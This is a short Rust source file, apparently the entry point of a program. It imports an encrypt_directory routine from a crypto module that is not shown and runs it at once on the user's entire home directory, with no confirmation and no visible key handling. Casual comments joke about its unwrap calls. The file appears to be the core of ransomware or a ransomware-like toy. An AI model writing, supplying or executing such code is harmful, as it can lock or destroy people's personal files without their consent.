mod crypto;
use crypto::encrypt_directory;
extern crate dirs;
use dirs::home_dir;

fn main() {
    let home = home_dir().unwrap(); // no way this could fail!
    encrypt_directory(home.to_str().unwrap()).unwrap(); // I know this many unwraps look
                                                        // suspicious, but the chance of this
                                                        // failing is less than a solar flare.
}
